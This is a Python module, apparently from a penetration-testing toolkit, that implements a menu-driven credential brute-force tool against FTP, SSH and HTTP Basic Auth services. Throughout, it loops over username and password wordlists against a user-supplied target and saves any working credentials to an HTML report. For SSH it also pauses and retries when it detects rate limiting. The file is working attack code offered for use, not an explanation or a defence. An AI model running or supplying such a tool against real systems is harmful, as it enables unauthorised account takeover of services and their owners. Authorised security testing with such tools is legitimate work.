import ftplib
import os
import paramiko
import requests # Added for HTTP requests
from requests.auth import HTTPBasicAuth # Added for Basic Auth
from datetime import datetime
import time
import random
from utils.reporter import write_html_section


def clear():
    os.system("cls" if os.name == "nt" else "clear")

def run_ftp_bruteforce():
    clear()
    print("\n🔐 [FTP Brute-Force]")

    target = input("Enter FTP IP or domain: ").strip()
    port = input("Enter port (default 21): ").strip()
    port = int(port) if port else 21

    userlist_path = input("Path to username wordlist (e.g. wordlists/users.txt): ").strip()
    passlist_path = input("Path to password wordlist (e.g. wordlists/passwords.txt): ").strip()

    if not os.path.exists(userlist_path) or not os.path.exists(passlist_path):
        print("[❌] Wordlist file(s) not found.")
        input("Press Enter to return...")
        return

    try:
        with open(userlist_path, 'r', encoding='utf-8', errors='ignore') as ufile:
         usernames = [u.strip() for u in ufile if u.strip()]
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as pfile:
         passwords = [p.strip() for p in pfile if p.strip()]
    except Exception as e:
        print(f"[❌] Error reading files: {e}")
        input("Press Enter to return...")
        return


    print(f"\n[🔍] Starting brute-force on {target}:{port}...\n")

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target, port, timeout=3)
                ftp.login(username, password)
                print(f"[✅] SUCCESS: {username}:{password}")
                ftp.quit()                
                lines = [
                    f"Target: {target}:{port}",
                    f"Service: FTP",
                    f"Credentials: {username}:{password}"
                ]
                write_html_section("Brute-Force Results", lines)
                print("[💾] Appended to report.html")
                input("Press Enter to return...")
                return
            except ftplib.error_perm:
                print(f"[❌] Failed: {username}:{password}")
            except Exception as e:
                print(f"[⚠️ ] Error: {e}")
                break

    print("\n[❌] No valid credentials found.")
    input("Press Enter to return...")

import os, time, random, paramiko
from tqdm import tqdm  # install with: pip install tqdm

def run_ssh_bruteforce():
    clear()
    print("\n🔐 [SSH Brute-Force] (Single Username Mode)")

    target = input("Enter SSH IP or domain: ").strip()
    port = input("Enter port (default 22): ").strip()
    port = int(port) if port else 22

    username = input("Enter known username: ").strip()
    passlist_path = input("Path to password wordlist: ").strip()

    if not os.path.exists(passlist_path):
        print("[❌] Password wordlist not found.")
        input("Press Enter to return...")
        return

    try:
        with open(passlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[❌] Error reading wordlist: {e}")
        input("Press Enter to return...")
        return

    print(f"\n[🔍] Brute-forcing {target}:{port} with user '{username}' ({len(passwords):,} passwords)\n")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in tqdm(passwords, desc="Trying passwords", unit="pw"):
        try:
            client.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=5,
                auth_timeout=5,
                banner_timeout=5,
                allow_agent=False,
                look_for_keys=False
            )
            print(f"\n[✅] SUCCESS! Credentials: {username}:{password}")
            lines = [
                f"Target: {target}:{port}",
                f"Service: SSH",
                f"Credentials: {username}:{password}"
            ]
            write_html_section("Brute-Force Results", lines)
            print("[💾] Appended to report.html")
            client.close()
            break

        except paramiko.AuthenticationException:
            pass  # invalid login, ignore
        except paramiko.SSHException as e:
            tqdm.write(f"[⚠️ ] SSH error or rate-limiting detected: {e}")
            time.sleep(random.uniform(5, 10))
        except Exception as e:
            tqdm.write(f"[❌] Unexpected error: {e}")
        finally:
            client.close()
    else:
        print("\n[❌] No valid password found.")

    input("Press Enter to return...")


def run_http_bruteforce():
    clear()
    print("\n🔐 [HTTP Basic Auth Brute-Force]")

    target_url = input("Enter Target URL (e.g., http://example.com/protected): ").strip()
    userlist_path = input("Path to username wordlist (e.g. wordlists/users.txt): ").strip()
    passlist_path = input("Path to password wordlist (e.g. wordlists/passwords.txt): ").strip()

    if not os.path.exists(userlist_path) or not os.path.exists(passlist_path):
        print("[❌] Wordlist file(s) not found.")
        input("Press Enter to return...")
        return

    try:
        with open(userlist_path, 'r', encoding='utf-8', errors='ignore') as ufile:
            usernames = [u.strip() for u in ufile if u.strip()]
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as pfile:
            passwords = [p.strip() for p in pfile if p.strip()]
    except Exception as e:
        print(f"[❌] Error reading files: {e}")
        input("Press Enter to return...")
        return

    if not usernames or not passwords:
        print("[❌] Wordlists cannot be empty.")
        input("Press Enter to return...")
        return

    print(f"\n[🔍] Starting HTTP Basic Auth brute-force on {target_url}...\n")

    for username in tqdm(usernames, desc="Usernames", unit="user"):
        for password in tqdm(passwords, desc="Passwords", unit="pass", leave=False):
            try:
                response = requests.get(target_url, auth=HTTPBasicAuth(username, password), timeout=5)

                if response.status_code == 200:
                    print(f"\n[✅] SUCCESS: {username}:{password} (Status: {response.status_code})")
                    lines = [
                        f"Target URL: {target_url}",
                        f"Service: HTTP Basic Auth",
                        f"Credentials: {username}:{password}"
                    ]
                    write_html_section("Brute-Force Results", lines)
                    print("[💾] Appended to report.html")
                    input("Press Enter to return...")
                    return
                elif response.status_code == 401:
                    tqdm.write(f"[❌] Failed: {username}:{password} (Status: {response.status_code} Unauthorized)")
                elif response.status_code == 403:
                    tqdm.write(f"[❌] Failed: {username}:{password} (Status: {response.status_code} Forbidden)")
                else:
                    tqdm.write(f"[⚠️ ] Info: {username}:{password} (Status: {response.status_code})")

            except requests.exceptions.ConnectionError:
                tqdm.write(f"[❌] Error: Could not connect to {target_url}. Check URL and connection.")
                input("Press Enter to return...")
                return
            except requests.exceptions.Timeout:
                tqdm.write(f"[⚠️ ] Timeout connecting to {target_url} for {username}:{password}. Retrying may be needed or increase timeout.")
            except requests.exceptions.RequestException as e:
                tqdm.write(f"[❌] Error for {username}:{password}: {e}")

            # Small delay to avoid overwhelming the server, can be adjusted
            time.sleep(0.1)

    print("\n[❌] No valid credentials found.")
    input("Press Enter to return...")


def run():
    print("🔐 Brute-Force Toolkit") 
    print("[1] FTP Brute-Force")
    print("[2] SSH Brute-Force")
    print("[3] HTTP Basic Auth Brute-Force")
    print("[4] Back")
    choice = input("Select an option: ").strip()

    if choice == '1':
        run_ftp_bruteforce()
    elif choice == '2':
        run_ssh_bruteforce()
    elif choice == '3':
        run_http_bruteforce()
    elif choice == '4':
        return